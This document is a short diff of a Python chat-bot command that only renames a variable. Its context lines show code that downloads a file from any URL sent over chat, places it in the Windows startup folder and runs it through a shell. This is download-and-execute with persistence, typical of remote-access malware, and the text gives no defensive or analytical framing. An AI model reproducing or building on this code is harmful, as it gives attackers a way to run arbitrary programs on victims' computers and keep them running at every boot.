@@ -21,17 +21,17 @@ class AdvancedShare:
     def open_file(self, file_path):
         subprocess.Popen(['start', '', file_path], shell=True)
 
-advanced_share = AdvancedShare()
+advancedshare = AdvancedShare()
 
-async def advanced_share_command(ctx, url: str):
+async def advancedshare_command(ctx, url: str):
     if url:
         await ctx.send("Downloading file...")
 
-        file_path = advanced_share.download_file(url)
+        file_path = advancedshare.download_file(url)
 
         if os.path.exists(file_path):
-            await ctx.send(f"File downloaded to {advanced_share.startup_folder}. Opening now...")
-            advanced_share.open_file(file_path)
+            await ctx.send(f"File downloaded to {advancedshare.startup_folder}. Opening now...")
+            advancedshare.open_file(file_path)
         else:
             await ctx.send(f"Error downloading file: {file_path}")
     else:
